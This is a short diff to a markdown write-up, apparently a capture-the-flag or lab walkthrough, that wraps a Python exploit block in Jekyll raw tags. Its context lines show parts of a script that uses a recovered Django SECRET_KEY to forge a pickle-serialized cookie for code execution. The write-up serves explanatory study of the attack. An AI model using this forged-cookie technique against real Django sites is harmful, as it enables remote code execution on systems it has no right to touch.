@@ -41,6 +41,8 @@ But first, we would have to find the new `SECRET_KEY`, which appears to be store
 
 Now that we have the `SECRET_KEY`, we can use the following exploit script to generate a serialized cookie that contains the code we want to execute:
 
+<!-- {% raw %} -->
+
 ```py
 import subprocess
 import pickle
@@ -69,6 +71,8 @@ print(signing.dumps(Exploit(),
     serializer=PickleSerializer,
     compress=True))
 ```
+
+<!-- {% endraw %} -->
 
 Running the script to generate the cookie:
 
